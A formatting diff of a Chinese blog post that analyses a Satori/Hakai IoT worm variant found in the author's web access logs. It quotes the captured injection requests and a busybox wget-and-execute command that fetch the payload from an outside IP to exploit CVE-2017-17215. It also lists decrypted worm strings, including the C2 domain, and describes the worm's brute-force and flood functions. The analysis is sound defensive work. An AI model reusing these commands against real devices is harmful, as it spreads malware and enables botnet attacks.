@@ -235,101 +235,37 @@
         </header>
 
         <div class="post-content">
-            <h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
-<p>近日，在博客的访问日志上发现一些略显奇特的访问记录，看起来像是远程命令执行，在好奇心(<s>没事干</s>)的驱使下深究下去，然后终于――揭开了，嗯，蠕虫传播的冰山一角。。。<br>
-(本文标题为<code>360 netlab</code>发表的一篇蠕虫分析文章标题的意译)</p>
-<a id="more"></a>
-<h2 id="访问记录"><a class="markdownIt-Anchor" href="#访问记录"></a> 访问记录</h2>
-<p>笔者喜欢有事没事翻一下博客的访问记录，一来看看除了爬虫还有谁会看我的文章，二来观察爬虫、扫描器以及各种各样的payload的特征，寻找其有意思的地方，说不定以后还能当做自己扫描器的Fuzz路径或者按照思路做一个蜜罐啥的。<br>
-前几天随便扫一眼日志时，发现了类似命令执行的访问记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">156.211.122.123 - - [04/Aug/2018:21:50:41 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br><span class="line">41.45.142.236 - - [04/Aug/2018:23:07:02 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br><span class="line">156.219.34.60 - - [06/Aug/2018:01:42:11 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br><span class="line">197.43.118.238 - - [06/Aug/2018:02:10:07 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br></pre></td></tr></table></figure>
-<p>看起来就像是带着payload访问一下就能直接下载文件并执行。<br>
-访问<code>http://46.166.185.42/e</code></p>
-<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/16-09-00.jpg" alt=""><br>
-嗯，赤裸裸的命令执行<br>
-分别把文件下载下来执行再删除，很熟练的操作<br>
-很”庆幸“的是，我还能把文件下载下来，之前找过几个类似的，没一个能活到能下载给我分析的，这次只有<code>hakai.arm5</code>变<code>404</code>了<br>
-其余三个文件都是elf文件:<code>hakai.mips</code>、<code>hakai.mpsl</code>、<code>hakai.x86_64</code><br>
-我分析了其中一个――<code>hakai.x86_64</code>，毕竟从蠕虫作者的角度来想，每个文件的功能都一样是差不多的，只是运行在不同的平台，这样一来就能减少开发以及管理成本，所以分析一个就差不多了</p>
-<h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2>
-<p>打开IDA，静态分析一下。很庆幸并没有加壳混淆，对本菜十分友好。<br>
-其中出现的一些payload字符串拿去google一下，发现在今年6月份的时候，360 netlab已经发布了一篇文章――<a href="http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/" target="_blank" rel="noopener">Botnets never Die, Satori REFUSES to Fade Away</a>，经过分析，我拿到的样本从加密方式以及行为来看应该是Satori蠕虫的变种，所以本文也应用了这篇文章标题的意译作为标题。<br>
-先来看一下主函数：<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/15-01-30.jpg" alt=""><br>
-大概可以看出该蠕虫有以下功能</p>
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近日，在博客的访问日志上发现一些略显奇特的访问记录，看起来像是远程命令执行，在好奇心(<del>没事干</del>)的驱使下深究下去，然后终于――揭开了，嗯，蠕虫传播的冰山一角。。。<br>(本文标题为<code>360 netlab</code>发表的一篇蠕虫分析文章标题的意译)<br><a id="more"></a></p>
+<h2 id="访问记录"><a href="#访问记录" class="headerlink" title="访问记录"></a>访问记录</h2><p>笔者喜欢有事没事翻一下博客的访问记录，一来看看除了爬虫还有谁会看我的文章，二来观察爬虫、扫描器以及各种各样的payload的特征，寻找其有意思的地方，说不定以后还能当做自己扫描器的Fuzz路径或者按照思路做一个蜜罐啥的。<br>前几天随便扫一眼日志时，发现了类似命令执行的访问记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">156.211.122.123 - - [04/Aug/2018:21:50:41 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br><span class="line">41.45.142.236 - - [04/Aug/2018:23:07:02 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br><span class="line">156.219.34.60 - - [06/Aug/2018:01:42:11 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br><span class="line">197.43.118.238 - - [06/Aug/2018:02:10:07 +0800] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 173 &quot;-&quot; &quot;Hakai/2.0&quot;</span><br></pre></td></tr></table></figure></p>
+<p>看起来就像是带着payload访问一下就能直接下载文件并执行。<br>访问<code>http://46.166.185.42/e</code></p>
+<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/16-09-00.jpg" alt=""><br>嗯，赤裸裸的命令执行<br>分别把文件下载下来执行再删除，很熟练的操作<br>很”庆幸“的是，我还能把文件下载下来，之前找过几个类似的，没一个能活到能下载给我分析的，这次只有<code>hakai.arm5</code>变<code>404</code>了<br>其余三个文件都是elf文件:<code>hakai.mips</code>、<code>hakai.mpsl</code>、<code>hakai.x86_64</code><br>我分析了其中一个――<code>hakai.x86_64</code>，毕竟从蠕虫作者的角度来想，每个文件的功能都一样是差不多的，只是运行在不同的平台，这样一来就能减少开发以及管理成本，所以分析一个就差不多了</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>打开IDA，静态分析一下。很庆幸并没有加壳混淆，对本菜十分友好。<br>其中出现的一些payload字符串拿去google一下，发现在今年6月份的时候，360 netlab已经发布了一篇文章――<a href="http://blog.netlab.360.com/botnets-never-die-satori-refuses-to-fade-away-en/" target="_blank" rel="noopener">Botnets never Die, Satori REFUSES to Fade Away</a>，经过分析，我拿到的样本从加密方式以及行为来看应该是Satori蠕虫的变种，所以本文也应用了这篇文章标题的意译作为标题。<br>先来看一下主函数：<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/15-01-30.jpg" alt=""><br>大概可以看出该蠕虫有以下功能</p>
 <ul>
 <li>修改进程名为<code>sshd</code>或<code>/usr/sbin/dropbear</code>进行隐藏</li>
 <li>针对华为、dlink设备特定漏洞进行传播</li>
 <li>针对23、2323端口Telnet服务进行密码爆破攻击</li>
 <li>疑似设备操作方式实现持续化控制(wacthdog)</li>
-<li>实现远控。从主机接受特定格式的指令，实现自定义HTTP包发送、TCP Flood、UDP Flood以及Std Flood<br>
-其中还有一些加密字符串</li>
+<li>实现远控。从主机接受特定格式的指令，实现自定义HTTP包发送、TCP Flood、UDP Flood以及Std Flood<br>其中还有一些加密字符串</li>
 </ul>
 <p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-21-47.jpg" alt=""></p>
-<p>加/解密算法均为<code>deobf()</code><br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-23-09.jpg" alt=""><br>
-看起来是简单的置换密码<br>
-直接在源文件上<code>patch</code>一段解密汇编得到每个索引对应的密文(中间有些索引没用，所以索引不连续)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. gosh that chinese family at the other table sure ate alot</span><br><span class="line">2. hakaiboatnet.pw</span><br><span class="line">3. /proc/</span><br><span class="line">4. /exe</span><br><span class="line">6. /fd</span><br><span class="line">7. /maps</span><br><span class="line">8. /proc/net/tcp</span><br><span class="line">9. 1gcab4dom35hnp2lei0jkf</span><br><span class="line">10. UPX!</span><br><span class="line">11. dvrHelper</span><br><span class="line">15. /dev/watchdog</span><br><span class="line">16. /dev/misc/watchdog</span><br><span class="line">17. shell</span><br><span class="line">18. enable</span><br><span class="line">19. system</span><br><span class="line">20. /bin/busybox REKAI</span><br><span class="line">21. sh</span><br><span class="line">22. REKAI: applet not found</span><br><span class="line">23. ncorrect</span><br><span class="line">26. /bin/busybox ps</span><br><span class="line">27. /bin/busybox kill -9/</span><br></pre></td></tr></table></figure>
-<p>emmm，其他都能理解，这第一个加密的吐槽是跟国人有仇咩<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-41-13.jpg" alt=""><br>
-嗯，蠕虫作者应该是个外国人，而且极有可能在餐厅写蠕虫的时候旁边桌的国人放了个屁~</p>
-<h4 id="端口爆破"><a class="markdownIt-Anchor" href="#端口爆破"></a> 端口爆破</h4>
-<p>先看看各个部分的功能与流程<br>
-蠕虫作者首先对爆破的账号密码进行了加密，然后解密加进账号密码内存池待用<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/11-18-55.jpg" alt="">然后进行23以及2323端口进行端口开发探测，并加进连接记录表</p>
-<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/11-51-40.jpg" alt=""><br>
-然后根据返回信息的解析进行账号密码的爆破<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/11-54-46.jpg" alt=""><br>
-最后起shell<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/18-47-53.jpg" alt=""><br>
-嗯，终于明白为什么之前我的22端口一直被爆破，每次登上去都有几千个错误尝试的记录<br>
-恐怕都是这些僵尸网络干的<br>
-不过后面我尝试把登录端口换成一个四位数的端口，从此世界都清净了<br>
-有强迫症的读者可以一试</p>
-<h4 id="huawei_scanner"><a class="markdownIt-Anchor" href="#huawei_scanner"></a> huawei_scanner</h4>
-<p>这个部分主要是针对华为路由器漏洞CVE-2017-17215的进行利用然后传播。<br>
-漏洞原理可以看<a href="https://paper.seebug.org/490/" target="_blank" rel="noopener">Seebug Paper - Huawei HG532 系列路由器远程命令执行漏洞分析</a><br>
-利用姿势可以参考<a href="https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/" target="_blank" rel="noopener">玄武实验室 - 对华为HG532远程命令执行漏洞的新探索</a><br>
-Satori用的是这个<code>payload</code>：</p>
-<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-00-32.jpg" alt=""><br>
-嗯，看起来是XXE<br>
-同理首先构造了一个TCP包发出去<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/18-50-59.jpg" alt=""><br>
-接收数据包并判断是否是是<code>37215</code>漏洞端口发出的<code>SYN-ACK</code>包<br>
-随之TCP握手<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-07-15.jpg" alt=""><br>
-开始发<code>palyload</code></p>
-<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-10-45.jpg" alt=""><br>
-无非是想执行这一段命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/busybox wget -g 46.166.185.42 -l /tmp/hakai -r /hakai.huawei</span><br><span class="line">/bin/busybox chmod 777 * /tmp/hakai; /tmp/hakai huawei</span><br><span class="line"><span class="built_in">echo</span> HUAWEIUPNP</span><br></pre></td></tr></table></figure>
-<p>就这样，这样蠕虫传播完成<br>
-不过一般情况下WAN口访问<code>37215</code>端口是被过滤的，所以还是有一些局限性的</p>
-<h4 id="dlink_scanner"><a class="markdownIt-Anchor" href="#dlink_scanner"></a> dlink_scanner</h4>
-<p>dlink_scanner利用的是<code>D-Link DSL-2750B</code>上的远程命令执行漏洞<br>
-简单一个参数就能远程执行命令<br>
-<code>payload</code>如下<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-19-03.jpg" alt=""><br>
-扫描的步骤和上面提到的大同小异，都是先探测记录后发送payload，然后再执行命令，下载远程恶意文件执行<br>
-在此不再赘述</p>
-<h4 id="远控功能"><a class="markdownIt-Anchor" href="#远控功能"></a> 远控功能</h4>
-<p>执行完扫描传播之后，蠕虫会有一个<code>while(1)</code>循环一直接受来自主机的指令以解析执行<br>
-其中可执行的有四个功能：</p>
+<p>加/解密算法均为<code>deobf()</code><br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-23-09.jpg" alt=""><br>看起来是简单的置换密码<br>直接在源文件上<code>patch</code>一段解密汇编得到每个索引对应的密文(中间有些索引没用，所以索引不连续)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. gosh that chinese family at the other table sure ate alot</span><br><span class="line">2. hakaiboatnet.pw</span><br><span class="line">3. /proc/</span><br><span class="line">4. /exe</span><br><span class="line">6. /fd</span><br><span class="line">7. /maps</span><br><span class="line">8. /proc/net/tcp</span><br><span class="line">9. 1gcab4dom35hnp2lei0jkf</span><br><span class="line">10. UPX!</span><br><span class="line">11. dvrHelper</span><br><span class="line">15. /dev/watchdog</span><br><span class="line">16. /dev/misc/watchdog</span><br><span class="line">17. shell</span><br><span class="line">18. enable</span><br><span class="line">19. system</span><br><span class="line">20. /bin/busybox REKAI</span><br><span class="line">21. sh</span><br><span class="line">22. REKAI: applet not found</span><br><span class="line">23. ncorrect</span><br><span class="line">26. /bin/busybox ps</span><br><span class="line">27. /bin/busybox kill -9/</span><br></pre></td></tr></table></figure></p>
+<p>emmm，其他都能理解，这第一个加密的吐槽是跟国人有仇咩<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-41-13.jpg" alt=""><br>嗯，蠕虫作者应该是个外国人，而且极有可能在餐厅写蠕虫的时候旁边桌的国人放了个屁~</p>
+<h4 id="端口爆破"><a href="#端口爆破" class="headerlink" title="端口爆破"></a>端口爆破</h4><p>先看看各个部分的功能与流程<br>蠕虫作者首先对爆破的账号密码进行了加密，然后解密加进账号密码内存池待用<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/11-18-55.jpg" alt="">然后进行23以及2323端口进行端口开发探测，并加进连接记录表</p>
+<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/11-51-40.jpg" alt=""><br>然后根据返回信息的解析进行账号密码的爆破<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/11-54-46.jpg" alt=""><br>最后起shell<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/18-47-53.jpg" alt=""><br>嗯，终于明白为什么之前我的22端口一直被爆破，每次登上去都有几千个错误尝试的记录<br>恐怕都是这些僵尸网络干的<br>不过后面我尝试把登录端口换成一个四位数的端口，从此世界都清净了<br>有强迫症的读者可以一试</p>
+<h4 id="huawei-scanner"><a href="#huawei-scanner" class="headerlink" title="huawei_scanner"></a>huawei_scanner</h4><p>这个部分主要是针对华为路由器漏洞CVE-2017-17215的进行利用然后传播。<br>漏洞原理可以看<a href="https://paper.seebug.org/490/" target="_blank" rel="noopener">Seebug Paper - Huawei HG532 系列路由器远程命令执行漏洞分析</a><br>利用姿势可以参考<a href="https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/" target="_blank" rel="noopener">玄武实验室 - 对华为HG532远程命令执行漏洞的新探索</a><br>Satori用的是这个<code>payload</code>：</p>
+<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-00-32.jpg" alt=""><br>嗯，看起来是XXE<br>同理首先构造了一个TCP包发出去<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/18-50-59.jpg" alt=""><br>接收数据包并判断是否是是<code>37215</code>漏洞端口发出的<code>SYN-ACK</code>包<br>随之TCP握手<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-07-15.jpg" alt=""><br>开始发<code>palyload</code></p>
+<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-10-45.jpg" alt=""><br>无非是想执行这一段命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/busybox wget -g 46.166.185.42 -l /tmp/hakai -r /hakai.huawei</span><br><span class="line">/bin/busybox chmod 777 * /tmp/hakai; /tmp/hakai huawei</span><br><span class="line"><span class="built_in">echo</span> HUAWEIUPNP</span><br></pre></td></tr></table></figure></p>
+<p>就这样，这样蠕虫传播完成<br>不过一般情况下WAN口访问<code>37215</code>端口是被过滤的，所以还是有一些局限性的</p>
+<h4 id="dlink-scanner"><a href="#dlink-scanner" class="headerlink" title="dlink_scanner"></a>dlink_scanner</h4><p>dlink_scanner利用的是<code>D-Link DSL-2750B</code>上的远程命令执行漏洞<br>简单一个参数就能远程执行命令<br><code>payload</code>如下<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/19-19-03.jpg" alt=""><br>扫描的步骤和上面提到的大同小异，都是先探测记录后发送payload，然后再执行命令，下载远程恶意文件执行<br>在此不再赘述</p>
+<h4 id="远控功能"><a href="#远控功能" class="headerlink" title="远控功能"></a>远控功能</h4><p>执行完扫描传播之后，蠕虫会有一个<code>while(1)</code>循环一直接受来自主机的指令以解析执行<br>其中可执行的有四个功能：</p>
 <ol>
-<li>HTTPHEX<br>
-自定义发送<code>HTTP</code>请求<br>
-支持<code>GET</code>，<code>POST</code>，<code>HEAD</code>三种方式，以及随机以下几个UA：<br>
-<img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-52-08.jpg" alt=""></li>
+<li>HTTPHEX<br>自定义发送<code>HTTP</code>请求<br>支持<code>GET</code>，<code>POST</code>，<code>HEAD</code>三种方式，以及随机以下几个UA：<br><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/20-52-08.jpg" alt=""></li>
 <li>UDP Flood DOS攻击指定目标</li>
 <li>TCP Flood DOS攻击指定目标</li>
-<li>Std Flood DOS攻击指定目标<br>
-不明所以的Std Flood功能，看起来只是UDP Flood，并没有UDP Flood 部分代码那么复杂</li>
+<li>Std Flood DOS攻击指定目标<br>不明所以的Std Flood功能，看起来只是UDP Flood，并没有UDP Flood 部分代码那么复杂</li>
 </ol>
-<h2 id="写在最后"><a class="markdownIt-Anchor" href="#写在最后"></a> 写在最后</h2>
-<p>根据<a href="https://www.tachyonsystems.de/honeynet.php" target="_blank" rel="noopener">tachyonsystems.de</a>的蜜罐攻击记录来看，Satori蠕虫在过去几天活动极为频繁，甚至已经跃升第一</p>
-<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/01-28-19.jpg" alt=""><br>
-并且在本菜写文章这两天，蠕虫主机IP的蠕虫程序已经经历了代码变种-&gt;加入混淆-&gt;无法访问(或者跑路)三个阶段，可谓瞬息万变。<br>
-安全之路，仍任重道远。</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>根据<a href="https://www.tachyonsystems.de/honeynet.php" target="_blank" rel="noopener">tachyonsystems.de</a>的蜜罐攻击记录来看，Satori蠕虫在过去几天活动极为频繁，甚至已经跃升第一</p>
+<p><img src="/2018/08/06/Satori不愿消退，僵尸网络永不消亡/01-28-19.jpg" alt=""><br>并且在本菜写文章这两天，蠕虫主机IP的蠕虫程序已经经历了代码变种-&gt;加入混淆-&gt;无法访问(或者跑路)三个阶段，可谓瞬息万变。<br>安全之路，仍任重道远。</p>
 
         </div>
 
